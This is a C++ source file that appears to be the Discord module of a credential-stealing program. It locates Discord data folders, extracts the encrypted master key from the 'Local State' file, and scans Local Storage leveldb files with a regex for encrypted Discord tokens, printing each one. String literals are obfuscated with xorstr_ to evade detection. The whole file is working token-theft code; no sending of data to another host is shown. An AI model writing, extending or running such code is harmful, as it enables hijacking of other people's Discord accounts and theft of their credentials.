//
// Created by .1qxz on 07.06.2024.
//

#include "Discord.h"

void Discord::execute(fs::path &root) {
    for(const std::string& token : this->getTokens())
    {
        std::cout << token << std::endl;
    }
}

std::vector<std::string> Discord::getTokens() {
    std::vector<std::string> tokens;

    for(const fs::path& path : this->discord_paths)
    {
        std::vector<std::string> scannedTokens = this->getToken(const_cast<fs::path &>(path));
        if(scannedTokens.empty())
            continue;

        for(const std::string& scannedToken : scannedTokens)
        {
            tokens.push_back(scannedToken);
        }
    }

    return tokens;
}

std::vector<std::string> Discord::getToken(fs::path &root) {

    if(!exists(root))
        return {};

    std::string masterKey = Discord::getMaterKey(root);
    if(masterKey.empty())
        return {};


    return this->scanToken(root, masterKey);
}

std::string Discord::getMaterKey(fs::path &root) {
    if(!exists(root))
        return "";

    std::string masterKey;
    try
    {
        fs::path localStatePath = root / xorstr_("Local State");

        if(!exists(localStatePath))
            return "";

        std::string content = Utils::readFile(localStatePath);
        if(content.empty())
            return "";

        json jsonObject = json::parse(content);
        masterKey = jsonObject[xorstr_("os_crypt")][xorstr_("encrypted_key")];
    }
    catch (const std::exception& e)
    {
        return "";
    }

    return masterKey;
}

std::vector<std::string> Discord::scanToken(fs::path &root, std::string master_key) {
    std::vector<std::string> tokens;

    fs::path scan_path = root / "Local Storage" / "leveldb";
    std::regex token_regex(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)");

    if (fs::exists(scan_path) && fs::is_directory(scan_path)) {
        for (const fs::path &entry: fs::directory_iterator(scan_path)) {
            if(!(entry.filename().string().ends_with(".ldb") || entry.filename().string().ends_with(".log")))
                continue;

            std::string content = Utils::readFile(entry);
            if(content.empty())
                continue;

            for(std::string &line : Utils::splitString(content, '\n'))
            {
                line = std::regex_replace(line, std::regex(R"(\s+$)"), "");
                std::smatch match;

                while (std::regex_search(line, match, token_regex)) {
                    std::string unformatted_token = match.str(0);
                    if (unformatted_token.back() == '\\') {
                        unformatted_token.pop_back();
                    }

                    tokens.push_back(unformatted_token);

                    line = match.suffix().str();
                }
            }
        }
    }

    return tokens;
}